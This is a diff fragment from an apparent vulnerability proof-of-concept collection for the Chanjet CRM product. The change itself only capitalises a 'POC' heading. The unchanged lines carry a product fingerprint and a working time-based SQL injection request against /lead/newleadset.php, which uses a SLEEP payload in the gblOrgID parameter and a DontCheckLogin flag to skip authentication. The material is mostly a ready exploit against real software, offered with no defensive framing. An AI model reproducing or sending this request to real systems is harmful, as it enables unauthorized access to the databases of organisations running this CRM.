@@ -8,7 +8,7 @@
 app="畅捷通-畅捷CRM"
 ```
 
-## poc
+## POC
 
 ```javascript
 GET /lead/newleadset.php?gblOrgID=1+AND+(SELECT+5244+FROM+(SELECT(SLEEP(5)))HAjH)--+-&DontCheckLogin=1 HTTP/1.1
